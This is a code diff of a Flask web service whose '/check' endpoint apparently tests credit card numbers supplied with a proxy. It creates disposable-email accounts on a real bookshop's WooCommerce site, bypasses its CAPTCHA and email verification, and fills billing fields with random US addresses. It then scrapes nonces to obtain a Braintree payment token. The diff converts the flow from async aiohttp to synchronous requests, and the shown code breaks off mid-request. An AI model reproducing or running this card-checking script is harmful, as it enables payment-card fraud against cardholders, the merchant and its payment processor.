@@ -1,6 +1,4 @@
 from flask import Flask, request, jsonify
-import asyncio
-import aiohttp
 import requests
 import time
 import re
@@ -56,15 +54,9 @@ def parse_proxy(proxy_string):
             'http': f'http://{user}:{password}@{host}:{port}',
             'https': f'http://{user}:{password}@{host}:{port}'
         }
-    elif len(parts) == 2:
-        host, port = parts
-        return {
-            'http': f'http://{host}:{port}',
-            'https': f'http://{host}:{port}'
-        }
     return None
 
-def get_random_domain(proxy_dict):
+def get_random_domain():
     vowels = 'aeiou'
     consonants = 'bcdfghjklmnpqrstvwxyz'
     keyword = random.choice(consonants) + random.choice(vowels)
@@ -76,8 +68,7 @@ def get_random_domain(proxy_dict):
             response = requests.get(
                 f'https://generator.email/search.php?key={keyword}',
                 headers={'User-Agent': get_fake_chrome_ua()},
-                timeout=30,
-                proxies=proxy_dict
+                timeout=30
             )
             domains = response.json()
             valid_domains = [d for d in domains if all(ord(c) < 128 for c in d)]
@@ -91,8 +82,8 @@ def get_random_domain(proxy_dict):
             time.sleep(2)
     return None
 
-def generate_email_from_api(proxy_dict):
-    domain = get_random_domain(proxy_dict)
+def generate_email_from_api():
+    domain = get_random_domain()
     if not domain:
         fallback_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com', 'protonmail.com']
         domain = random.choice(fallback_domains)
@@ -104,7 +95,7 @@ def generate_email_from_api(proxy_dict):
     email = f"{username}@{domain}"
     return email.lower()
 
-def get_verification_link(email, domain, proxy_dict):
+def get_verification_link(email, domain):
     cookies = {
         'embx': f'[%22{email}%22]',
         'surl': f'{domain}/{email.split("@")[0]}'
@@ -126,8 +117,7 @@ def get_verification_link(email, domain, proxy_dict):
                 'https://generator.email/inbox1/',
                 headers=headers,
                 cookies=cookies,
-                timeout=30,
-                proxies=proxy_dict
+                timeout=30
             )
             
             soup = BeautifulSoup(response.text, 'html.parser')
@@ -247,6 +237,8 @@ def health_check():
 
 @app.route('/check', methods=['GET'])
 def check_card():
+    session = requests.Session()
+    
     try:
         cc_details = request.args.get('cc')
         proxy_string = request.args.get('proxy')
@@ -297,7 +289,7 @@ def check_card():
         
         proxy_dict = parse_proxy(proxy_string) if proxy_string else None
         
-        email = generate_email_from_api(proxy_dict)
+        email = generate_email_from_api()
         domain = email.split('@')[1]
         us_address = random.choice(StaticData.get_us_addresses()['addresses'])
         
@@ -315,384 +307,359 @@ def check_card():
                 'message': 'Failed to solve CAPTCHA'
             }), 200
         
-        connector = aiohttp.TCPConnector(limit=200)
+        headers1 = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Upgrade-Insecure-Requests': '1',
+            'Connection': 'keep-alive',
+        }
         
-        async def process_card():
-            proxy_url = proxy_dict['http'] if proxy_dict else None
-            
-            async with aiohttp.ClientSession(connector=connector) as session:
-                headers1 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Cache-Control': 'no-cache',
-                    'Pragma': 'no-cache',
-                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                    'Sec-Ch-Ua-Mobile': '?0',
-                    'Sec-Ch-Ua-Platform': '"Windows"',
-                    'Sec-Fetch-Site': 'none',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-User': '?1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Upgrade-Insecure-Requests': '1',
-                    'Connection': 'keep-alive',
-                }
-                
-                async with session.get('https://www.windhorsepublications.com/my-account/', headers=headers1, proxy=proxy_url) as response:
-                    html = await response.text()
-                
-                soup = BeautifulSoup(html, 'html.parser')
-                register_nonce = None
-                register_nonce_input = soup.find('input', {'id': 'woocommerce-register-nonce'})
-                if register_nonce_input:
-                    register_nonce = register_nonce_input.get('value')
-                else:
-                    return {'status': 'error', 'message': 'Failed to get register nonce'}
-                
-                headers2 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Cache-Control': 'max-age=0',
-                    'Origin': 'https://www.windhorsepublications.com',
-                    'Referer': 'https://www.windhorsepublications.com/my-account/',
-                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                    'Sec-Ch-Ua-Mobile': '?0',
-                    'Sec-Ch-Ua-Platform': '"Windows"',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-User': '?1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Upgrade-Insecure-Requests': '1',
-                }
-                
-                ua = UserAgent()
-                user_agent = ua.random
-                
-                data = f'email={email}&cf-turnstile-response={token}&mailchimp_woocommerce_gdpr[621a3e895f]=0&mailchimp_woocommerce_gdpr[621a3e895f]=1&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2F&wc_order_attribution_session_start_time={current_time}&wc_order_attribution_session_pages=19&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user_agent}&woocommerce-register-nonce={register_nonce}&_wp_http_referer=%2Fmy-account%2F&register=Register'
-                
-                async with session.post('https://www.windhorsepublications.com/my-account/', headers=headers2, data=data, proxy=proxy_url) as response:
-                    html = await response.text()
-                
-                verification_link = get_verification_link(email, domain, proxy_dict)
-                
-                if not verification_link:
-                    return {'status': 'error', 'message': 'Failed to get verification link'}
-                
-                reset_key, reset_login = extract_reset_key_and_login(verification_link)
-                
-                headers3 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                    'Sec-Ch-Ua-Mobile': '?0',
-                    'Sec-Ch-Ua-Platform': '"Windows"',
-                    'Sec-Fetch-Site': 'cross-site',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-User': '?1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Upgrade-Insecure-Requests': '1',
-                }
-                
-                params = {
-                    'action': 'newaccount',
-                    'key': reset_key,
-                    'login': reset_login,
-                }
-                
-                async with session.get('https://www.windhorsepublications.com/my-account/lost-password/', params=params, headers=headers3, proxy=proxy_url) as response:
-                    html = await response.text()
-                
-                soup = BeautifulSoup(html, 'html.parser')
-                reset_nonce = extract_reset_nonce(soup)
-                
-                if not reset_nonce:
-                    return {'status': 'error', 'message': 'Failed to get reset nonce'}
-                
-                password = "DDcc55@&#"
-                
-                headers4 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Cache-Control': 'max-age=0',
-                    'Origin': 'https://www.windhorsepublications.com',
-                    'Referer': f'https://www.windhorsepublications.com/my-account/lost-password/?show-reset-form=true&action=newaccount&key={reset_key}&login={reset_login}',
-                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                    'Sec-Ch-Ua-Mobile': '?0',
-                    'Sec-Ch-Ua-Platform': '"Windows"',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-User': '?1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Upgrade-Insecure-Requests': '1',
-                }
-                
-                params2 = {
-                    'show-reset-form': 'true',
-                    'action': 'newaccount',
-                }
-                
-                data2 = {
-                    'password_1': password,
-                    'password_2': password,
-                    'reset_key': reset_key,
-                    'reset_login': reset_login,
-                    'wc_reset_password': 'true',
-                    'woocommerce-reset-password-nonce': reset_nonce,
-                    '_wp_http_referer': '/my-account/lost-password/?show-reset-form=true&action=newaccount',
-                }
-                
-                async with session.post('https://www.windhorsepublications.com/my-account/lost-password/', params=params2, headers=headers4, data=data2, proxy=proxy_url) as response:
-                    pass
-                
-                headers5 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Cache-Control': 'max-age=0',
-                    'Referer': 'https://www.windhorsepublications.com/my-account/edit-address/billing/',
-                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                    'Sec-Ch-Ua-Mobile': '?0',
-                    'Sec-Ch-Ua-Platform': '"Windows"',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-User': '?1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Upgrade-Insecure-Requests': '1',
-                }
-                
-                async with session.get('https://www.windhorsepublications.com/my-account/edit-address/billing', headers=headers5, proxy=proxy_url) as response:
-                    html = await response.text()
-                
-                soup = BeautifulSoup(html, 'html.parser')
-                address_nonce = None
-                address_nonce_input = soup.find('input', {'id': 'woocommerce-edit-address-nonce'})
-                if address_nonce_input:
-                    address_nonce = address_nonce_input.get('value')
-                else:
-                    return {'status': 'error', 'message': 'Failed to get address nonce'}
-                
-                headers6 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                    'Cache-Control': 'max-age=0',
-                    'Origin': 'https://www.windhorsepublications.com',
-                    'Referer': 'https://www.windhorsepublications.com/my-account/edit-address/billing/',
-                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                    'Sec-Ch-Ua-Mobile': '?0',
-                    'Sec-Ch-Ua-Platform': '"Windows"',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-User': '?1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Upgrade-Insecure-Requests': '1',
-                }
-                
-                data3 = {
-                    'billing_email': email,
-                    'billing_first_name': us_address['city'],
-                    'billing_last_name': username,
-                    'billing_company': 'None',
-                    'billing_country': 'US',
-                    'billing_address_1': us_address['line1'],
-                    'billing_address_2': us_address['line2'],
-                    'billing_city': us_address['city'],
-                    'billing_state': us_address['state'],
-                    'billing_postcode': us_address['postcode'],
-                    'billing_phone': '2125551234',
-                    'save_address': 'Save address',
-                    'woocommerce-edit-address-nonce': address_nonce,
-                    '_wp_http_referer': '/my-account/edit-address/billing/',
-                    'action': 'edit_address'
-                }
-                
-                async with session.post('https://www.windhorsepublications.com/my-account/edit-address/billing/', headers=headers6, data=data3, proxy=proxy_url) as response:
-                    pass
-                
-                headers7 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Accept-Encoding': 'gzip, deflate, br',
-                    'Cache-Control': 'max-age=0',
-                    'Referer': 'https://www.windhorsepublications.com/my-account/payment-methods/',
-                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                    'Sec-Ch-Ua-Mobile': '?0',
-                    'Sec-Ch-Ua-Platform': '"Windows"',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-Mode': 'navigate',
-                    'Sec-Fetch-User': '?1',
-                    'Sec-Fetch-Dest': 'document',
-                    'Upgrade-Insecure-Requests': '1',
-                }
-                
-                async with session.get('https://www.windhorsepublications.com/my-account/add-payment-method/', headers=headers7, proxy=proxy_url) as response:
-                    html = await response.text()
-                
-                soup = BeautifulSoup(html, 'html.parser')
-                payment_nonce = None
-                payment_nonce_input = soup.find('input', {'id': 'woocommerce-add-payment-method-nonce'})
-                if payment_nonce_input:
-                    payment_nonce = payment_nonce_input.get('value')
-                else:
-                    return {'status': 'error', 'message': 'Failed to get payment nonce'}
-                
-                script_content = None
-                for script in soup.find_all('script'):
-                    if script.string and 'wc_braintree_credit_card_payment_form_handler' in script.string:
-                        script_content = script.string
-                        break
-                
-                client_nonce = None
-                if script_content:
-                    match = re.search(r'"client_token_nonce":"([^"]+)"', script_content)
-                    if match:
-                        client_nonce = match.group(1)
-                
-                if not client_nonce:
-                    return {'status': 'error', 'message': 'Failed to get client nonce'}
-                
-                headers8 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Accept': 'application/json, text/javascript, */*; q=0.01',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    'Origin': 'https://www.windhorsepublications.com',
-                    'Referer': 'https://www.windhorsepublications.com/my-account/add-payment-method/',
-                    'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
-                    'Sec-Ch-Ua-Mobile': '?0',
-                    'Sec-Ch-Ua-Platform': '"Windows"',
-                    'Sec-Fetch-Site': 'same-origin',
-                    'Sec-Fetch-Mode': 'cors',
-                    'Sec-Fetch-Dest': 'empty',
-                    'X-Requested-With': 'XMLHttpRequest',
-                }
-                
-                payload = {'action': "wc_braintree_credit_card_get_client_token", 'nonce': client_nonce}
-                
-                async with session.post('https://www.windhorsepublications.com/wp-admin/admin-ajax.php', data=payload, headers=headers8, proxy=proxy_url) as response:
-                    result = await response.json()
-                
-                if not result.get('success'):
-                    return {'status': 'error', 'message': 'Failed to get client token'}
-                
-                token_data = json.loads(base64.b64decode(result['data']).decode('utf-8'))
-                auth = token_data.get('authorizationFingerprint')
-                
-                headers9 = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                    'Content-Type': 'application/json',
-                    'Authorization': f'Bearer {auth}',
-                    'Braintree-Version': '2018-05-10',
-                    'Origin': 'https://assets.braintreegateway.com',
-                    'Accept': 'application/json',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Sec-Fetch-Site': 'cross-site',
-                    'Sec-Fetch-Mode': 'cors',
-                    'Sec-Fetch-Dest': 'empty',
-                    'Referer': 'https://assets.braintreegateway.com/',
-                }
-                
-                graphql_payload = {
-                    'clientSdkMetadata': {
-                        'source': 'client',
-                        'integration': 'custom',
-                        'sessionId': braintree_session_id,
+        response = session.get('https://www.windhorsepublications.com/my-account/', headers=headers1, proxies=proxy_dict, timeout=30)
+        
+        soup = BeautifulSoup(response.text, 'html.parser')
+        register_nonce = None
+        register_nonce_input = soup.find('input', {'id': 'woocommerce-register-nonce'})
+        if register_nonce_input:
+            register_nonce = register_nonce_input.get('value')
+        else:
+            return jsonify({'status': 'error', 'message': 'Failed to get register nonce'}), 200
+        
+        headers2 = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Cache-Control': 'max-age=0',
+            'Origin': 'https://www.windhorsepublications.com',
+            'Referer': 'https://www.windhorsepublications.com/my-account/',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Upgrade-Insecure-Requests': '1',
+        }
+        
+        ua = UserAgent()
+        user_agent = ua.random
+        
+        data = f'email={email}&cf-turnstile-response={token}&mailchimp_woocommerce_gdpr[621a3e895f]=0&mailchimp_woocommerce_gdpr[621a3e895f]=1&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fwww.windhorsepublications.com%2Fmy-account%2F&wc_order_attribution_session_start_time={current_time}&wc_order_attribution_session_pages=19&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user_agent}&woocommerce-register-nonce={register_nonce}&_wp_http_referer=%2Fmy-account%2F&register=Register'
+        
+        response = session.post('https://www.windhorsepublications.com/my-account/', headers=headers2, data=data, proxies=proxy_dict, timeout=30)
+        
+        verification_link = get_verification_link(email, domain)
+        
+        if not verification_link:
+            return jsonify({'status': 'error', 'message': 'Failed to get verification link'}), 200
+        
+        reset_key, reset_login = extract_reset_key_and_login(verification_link)
+        
+        headers3 = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Site': 'cross-site',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Upgrade-Insecure-Requests': '1',
+        }
+        
+        params = {
+            'action': 'newaccount',
+            'key': reset_key,
+            'login': reset_login,
+        }
+        
+        response = session.get('https://www.windhorsepublications.com/my-account/lost-password/', params=params, headers=headers3, proxies=proxy_dict, timeout=30)
+        
+        soup = BeautifulSoup(response.text, 'html.parser')
+        reset_nonce = extract_reset_nonce(soup)
+        
+        if not reset_nonce:
+            return jsonify({'status': 'error', 'message': 'Failed to get reset nonce'}), 200
+        
+        password = "DDcc55@&#"
+        
+        headers4 = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Cache-Control': 'max-age=0',
+            'Origin': 'https://www.windhorsepublications.com',
+            'Referer': f'https://www.windhorsepublications.com/my-account/lost-password/?show-reset-form=true&action=newaccount&key={reset_key}&login={reset_login}',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Upgrade-Insecure-Requests': '1',
+        }
+        
+        params2 = {
+            'show-reset-form': 'true',
+            'action': 'newaccount',
+        }
+        
+        data2 = {
+            'password_1': password,
+            'password_2': password,
+            'reset_key': reset_key,
+            'reset_login': reset_login,
+            'wc_reset_password': 'true',
+            'woocommerce-reset-password-nonce': reset_nonce,
+            '_wp_http_referer': '/my-account/lost-password/?show-reset-form=true&action=newaccount',
+        }
+        
+        response = session.post('https://www.windhorsepublications.com/my-account/lost-password/', params=params2, headers=headers4, data=data2, proxies=proxy_dict, timeout=30)
+        
+        headers5 = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Referer': 'https://www.windhorsepublications.com/my-account/edit-address/billing/',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Upgrade-Insecure-Requests': '1',
+        }
+        
+        response = session.get('https://www.windhorsepublications.com/my-account/edit-address/billing', headers=headers5, proxies=proxy_dict, timeout=30)
+        
+        soup = BeautifulSoup(response.text, 'html.parser')
+        address_nonce = None
+        address_nonce_input = soup.find('input', {'id': 'woocommerce-edit-address-nonce'})
+        if address_nonce_input:
+            address_nonce = address_nonce_input.get('value')
+        else:
+            return jsonify({'status': 'error', 'message': 'Failed to get address nonce'}), 200
+        
+        headers6 = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Cache-Control': 'max-age=0',
+            'Origin': 'https://www.windhorsepublications.com',
+            'Referer': 'https://www.windhorsepublications.com/my-account/edit-address/billing/',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Upgrade-Insecure-Requests': '1',
+        }
+        
+        data3 = {
+            'billing_email': email,
+            'billing_first_name': us_address['city'],
+            'billing_last_name': username,
+            'billing_company': 'None',
+            'billing_country': 'US',
+            'billing_address_1': us_address['line1'],
+            'billing_address_2': us_address['line2'],
+            'billing_city': us_address['city'],
+            'billing_state': us_address['state'],
+            'billing_postcode': us_address['postcode'],
+            'billing_phone': '2125551234',
+            'save_address': 'Save address',
+            'woocommerce-edit-address-nonce': address_nonce,
+            '_wp_http_referer': '/my-account/edit-address/billing/',
+            'action': 'edit_address'
+        }
+        
+        response = session.post('https://www.windhorsepublications.com/my-account/edit-address/billing/', headers=headers6, data=data3, proxies=proxy_dict, timeout=30)
+        
+        headers7 = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Referer': 'https://www.windhorsepublications.com/my-account/payment-methods/',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-User': '?1',
+            'Sec-Fetch-Dest': 'document',
+            'Upgrade-Insecure-Requests': '1',
+        }
+        
+        response = session.get('https://www.windhorsepublications.com/my-account/add-payment-method/', headers=headers7, proxies=proxy_dict, timeout=30)
+        
+        soup = BeautifulSoup(response.text, 'html.parser')
+        payment_nonce = None
+        payment_nonce_input = soup.find('input', {'id': 'woocommerce-add-payment-method-nonce'})
+        if payment_nonce_input:
+            payment_nonce = payment_nonce_input.get('value')
+        else:
+            return jsonify({'status': 'error', 'message': 'Failed to get payment nonce'}), 200
+        
+        script_content = None
+        for script in soup.find_all('script'):
+            if script.string and 'wc_braintree_credit_card_payment_form_handler' in script.string:
+                script_content = script.string
+                break
+        
+        client_nonce = None
+        if script_content:
+            match = re.search(r'"client_token_nonce":"([^"]+)"', script_content)
+            if match:
+                client_nonce = match.group(1)
+        
+        if not client_nonce:
+            return jsonify({'status': 'error', 'message': 'Failed to get client nonce'}), 200
+        
+        headers8 = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Origin': 'https://www.windhorsepublications.com',
+            'Referer': 'https://www.windhorsepublications.com/my-account/add-payment-method/',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Dest': 'empty',
+            'X-Requested-With': 'XMLHttpRequest',
+        }
+        
+        payload = {'action': "wc_braintree_credit_card_get_client_token", 'nonce': client_nonce}
+        
+        response = session.post('https://www.windhorsepublications.com/wp-admin/admin-ajax.php', data=payload, headers=headers8, proxies=proxy_dict, timeout=30)
+        result = response.json()
+        
+        if not result.get('success'):
+            return jsonify({'status': 'error', 'message': 'Failed to get client token'}), 200
+        
+        token_data = json.loads(base64.b64decode(result['data']).decode('utf-8'))
+        auth = token_data.get('authorizationFingerprint')
+        
+        headers9 = {
